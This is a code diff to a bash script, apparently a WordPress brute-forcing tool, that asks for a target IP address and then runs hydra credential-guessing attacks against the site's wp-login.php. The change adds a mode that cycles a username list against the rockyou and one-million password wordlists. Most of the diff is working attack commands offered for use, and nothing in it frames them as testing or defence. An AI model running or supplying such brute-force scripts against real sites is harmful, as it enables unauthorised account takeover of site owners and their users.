@@ -8,7 +8,6 @@ RED='\033[0;31m'
 GREEN='\u001b[32m'
 NC='\033[0m' # No Color
 
-
 echo '___       __   ________  ________  ________  ___  ___  _________  ________ ________  ________  ________  _______   ________'
 echo '|\  \     |\  \|\   __  \|\   __  \|\   __  \|\  \|\  \|\___   ___\\  _____\\   __  \|\   __  \|\   ____\|\  ___ \ |\   __  \'
 echo '\ \  \    \ \  \ \  \|\  \ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \  \__/\ \  \|\  \ \  \|\  \ \  \___|\ \   __/|\ \  \|\  \'
@@ -46,8 +45,22 @@ echo -e "$GREEN""type your destined IP-Address: ""$NC"
 read -r IPADDRESS
 
 # variables for wordlists
-ROCKYOU='rockyou.txt'
-ONEMILPWLIST='1milpwlist.txt'
+ROCKYOU="$HOME""/wpbruteforcer/wordlists/rockyou.txt"
+ONEMILPWLIST="$HOME""/wpbruteforcer/wordlists/1milpwlist.txt"
+USERNAMELIST="$HOME""/wpbruteforcer/wordlists/usernames.txt"
+
+if [ "$REPLY" == 1 ]; then 
+    echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
+    select d in rockyou.txt 1milpwlist.txt; 
+    do test -n "$d" && break; 
+    echo -e "$RED>>> Invalid Selection""$NC"; done
+        if [ "$REPLY" == 1 ]; then 
+            echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
+            hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+        else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
+            hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+fi
+fi
 
 echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
 select d in rockyou.txt 1milpwlist.txt; 
@@ -56,7 +69,7 @@ echo -e "$RED>>> Invalid Selection""$NC"; done
 
 if [ "$REPLY" == 1 ]; then 
     echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
-    hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ROCKYOU "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
+    hydra -l "$USERNAME" -P "$ROCKYOU" "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 else echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
     hydra -l "$USERNAME" -P ~/wpbruteforcer/wordlists/$ONEMILPWLIST "$IPADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
 fi
